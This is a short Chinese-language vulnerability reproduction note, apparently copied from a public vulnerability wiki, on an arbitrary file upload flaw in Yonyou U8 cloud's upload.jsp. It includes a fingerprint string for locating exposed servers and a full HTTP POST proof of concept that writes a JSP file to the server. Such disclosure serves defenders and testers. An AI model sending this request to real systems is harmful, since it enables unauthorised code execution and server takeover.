---
title: "用友 U8 cloud upload.jsp 任意文件上传漏洞"
date: 2026-10-17 09:13:04
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "用友"
tags:
  - "用友"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

用友 U8 cloud upload.jsp 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

用友 U8 cloud

## 网络测绘

```
"开启U8 cloud云端之旅"
```

## 漏洞复现

登陆页面

![image-20231116141405041](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116141405041.png)

poc

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /linux/pages/upload.jsp HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
filename: Test.jsp
Accept-Encoding: gzip

&lt;% out.println("Test");%&gt;</code></pre>

</details>

![image-20231116141354722](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116141354722.png)

```
/linux/Test.jsp
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-U8-cloud-upload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
